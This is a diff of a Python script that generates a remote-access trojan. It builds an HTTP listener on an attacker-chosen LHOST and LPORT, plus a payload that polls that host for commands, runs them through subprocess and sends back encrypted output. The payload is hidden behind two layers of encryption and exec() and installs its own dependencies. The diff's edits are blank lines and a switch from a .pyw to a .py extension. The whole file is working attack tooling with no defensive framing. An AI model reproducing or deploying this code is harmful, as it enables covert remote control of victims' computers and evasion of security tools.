@@ -1,6 +1,8 @@
 import random, string, socket, subprocess
+
 print("\nChecking ...")
 check = subprocess.check_output("pip3 install pyfiglet cryptocode", shell = True)
+
 import pyfiglet, cryptocode
 print(pyfiglet.figlet_format("Generator"))
 
@@ -17,21 +19,29 @@ def IPv4():
     return IP
 
 print(f"[?] Your IPv4: {IPv4()}")
+
 LHOST = str(input("\n[+] Enter LHOST: "))
 LPORT = int(input("\n[+] Enter LPORT: "))
 Domain = f"http://{LHOST}:{LPORT}"
+
 print(f"\n[-] Domain: {Domain}")
+
 number = random.randint(1000,10000)
 Key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
+
 print("\n>>> Generating ...")
 
 Listener = f'''from http.server import BaseHTTPRequestHandler, HTTPServer
 import os, cryptocode, pyfiglet
+
 print(pyfiglet.figlet_format("Listener"))
+
 LHOST = "{LHOST}"
 LPORT = {LPORT}
+
 print("[-] Listening ...")
 print()
+
 class Server_Filter(BaseHTTPRequestHandler):
     def do_GET(self):
         CMD = str(input('>>> '))
@@ -48,6 +58,7 @@ class Server_Filter(BaseHTTPRequestHandler):
         Raw_Data = Post_Data.decode()
         Data = cryptocode.decrypt(Raw_Data,"{Key}")
         print(Data)
+
 if __name__ == '__main__':
     Server_Characteristic = HTTPServer((LHOST, LPORT), Server_Filter)
     try:
@@ -58,6 +69,7 @@ if __name__ == '__main__':
 '''
 Payload = f'''import requests, subprocess
 import cryptocode
+
 while True:
   try:
     get_raw_cmd = requests.get('{Domain}')
@@ -82,19 +94,24 @@ print(f"\n[-] 'Listener_{filename}.py' is generated")
 Long_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
 Encoded = cryptocode.encrypt(Payload,f'{Long_key}')
 Decoded = f"""import cryptocode 
+
 exec(str(cryptocode.decrypt('{Encoded}','{Long_key}')))"""
+
 Super_Long_key = ''.join(random.choices(string.ascii_uppercase + string.digits, k = number))
 Super_Encoded = cryptocode.encrypt(Decoded,f'{Super_Long_key}')
 Super_Decoded = f"""import subprocess
+
 subprocess.call("pip3 install cryptocode", shell = True)
+
 import cryptocode
 exec(str(cryptocode.decrypt('{Super_Encoded}','{Super_Long_key}')))"""
 
-with open(f"Payload_{filename}.pyw","a") as file:
+with open(f"Payload_{filename}.py","a") as file:
         file.write(Super_Decoded)
-print(f"\n[-] 'Payload_{filename}.pyw' is generated\n")
+print(f"\n[-] 'Payload_{filename}.py' is generated\n")
 
 Listening_optional = str(input("[+] Wanna active listening mode now ? (y/n): "))
+
 try:
     if Listening_optional == "yes" or Listening_optional == "Yes" or Listening_optional == "Y" or Listening_optional == "y": 
         subprocess.call(f"python3 Listener_{filename}.py", shell = True)
